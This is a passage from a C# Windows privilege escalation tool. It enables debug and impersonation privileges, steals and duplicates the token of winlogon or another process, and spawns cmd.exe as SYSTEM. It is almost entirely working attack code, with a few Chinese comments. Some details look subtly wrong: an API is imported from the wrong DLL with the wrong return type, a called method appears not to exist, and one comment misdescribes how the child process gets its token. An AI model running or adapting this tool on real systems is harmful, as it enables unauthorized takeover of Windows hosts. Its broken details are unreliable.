    static extern bool LookupPrivilegeValue(string sys, string name, out LUID l);
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool AdjustTokenPrivileges(IntPtr t, bool dis, ref TP tp, int len,
        IntPtr prev, IntPtr retLen);
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool GetLastError();
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool DuplicateTokenEx(IntPtr e, uint acc, IntPtr attrs, int lvl,
        int type, out IntPtr outTok);
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool ImpersonateLoggedOnUser(IntPtr t);
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool RevertToSelf();
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern bool CreateProcessWithTokenW(IntPtr tok, uint logon, IntPtr attrs,
        string app, IntPtr cd, uint flags, IntPtr env, string cwd, ref SI si, out PI pi);
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern bool CreateProcessW(string app, IntPtr cmd, IntPtr p, IntPtr t,
        bool inherit, uint flags, IntPtr env, string cwd, ref SI si, out PI pi);

    static void Priv(string name)
    {
        LUID l; if (!LookupPrivilegeValue(null, name, out l)) Fail("LookupPrivilegeValue");
        IntPtr tok; OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, out tok);
        TP tp = new TP { PrivilegeCount = 1 };
        tp.Privileges.Luid = l; tp.Privileges.Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(tok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
        if (GetLastError() == 0x00000565) Fail("AdjustTokenPrivileges ERROR_NOT_ALL_ASSIGNED");
        Console.WriteLine("[+] " + name);
    }

    static void Fail(string s)
    {
        Console.WriteLine("[-] " + s + " err=" + Marshal.GetLastWin32Error());
        Environment.Exit(1);
    }

    static void Spawn(IntPtr tok, string exe, string args)
    {
        SI si = new SI(); si.cb = Marshal.SizeOf(si); si.dwFlags = 1; // STARTF_USESHOWWINDOW
        si.wShowWindow = 1;                                              // SW_SHOWNORMAL
        PI pi; IntPtr cmd = Marshal.StringToHGlobalUni(args);
        bool ok = tok == IntPtr.Zero
            ? CreateProcessW(exe, cmd, IntPtr.Zero, IntPtr.Zero, true, 0, IntPtr.Zero, null, ref si, out pi)
            : CreateProcessWithTokenW(tok, 0, IntPtr.Zero, exe, cmd, 0, IntPtr.Zero, null, ref si, out pi);
        Marshal.FreeHGlobal(cmd);
        if (!ok) Fail("CreateProcess");
        Console.WriteLine("[+] shell pid=" + pi.dwProcessId);
        Console.WriteLine("[i] running: \"" + exe + "\" " + args);
    }

    static void Main(string[] a)
    {
        int pid = a.Length > 0 ? int.Parse(a[0]) : -1;
        string exe = a.Length > 1 ? a[1] : "C:\\Windows\\System32\\cmd.exe";
        string cmd = a.Length > 2 ? a[2] : "/c whoami";

        if (pid < 0)
        {
            var w = Process.GetProcessesByName("winlogon");
            if (w.Length == 0) Fail("no winlogon");
            pid = w[0].Id;
        }
        Console.WriteLine("[i] donor pid = " + pid + " (" + Process.GetProcessName(pid) + ")");

        Priv("SeDebugPrivilege");
        Priv("SeImpersonatePrivilege");

        IntPtr hp = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
        if (hp == IntPtr.Zero) Fail("OpenProcess " + pid);
        IntPtr procTok;
        if (!OpenProcessToken(hp, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY, out procTok))
            Fail("OpenProcessToken");

        IntPtr dup;
        if (!DuplicateTokenEx(procTok, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE |
            TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, IntPtr.Zero,
            SecurityImpersonation, TokenPrimary, out dup))
            Fail("DuplicateTokenEx");

        // 交互式 shell 需要环境块：走 ImpersonateLoggedOnUser + CreateProcessW
        if (ImpersonateLoggedOnUser(dup))
        {
            Spawn(IntPtr.Zero, exe, cmd);   // 以线程身份启动，子进程继承 SYSTEM
            RevertToSelf();
        }
        else Spawn(dup, exe, cmd);          // 退化路径：CreateProcessWithTokenW

        CloseHandle(dup); CloseHandle(procTok); CloseHandle(hp);
    }
}
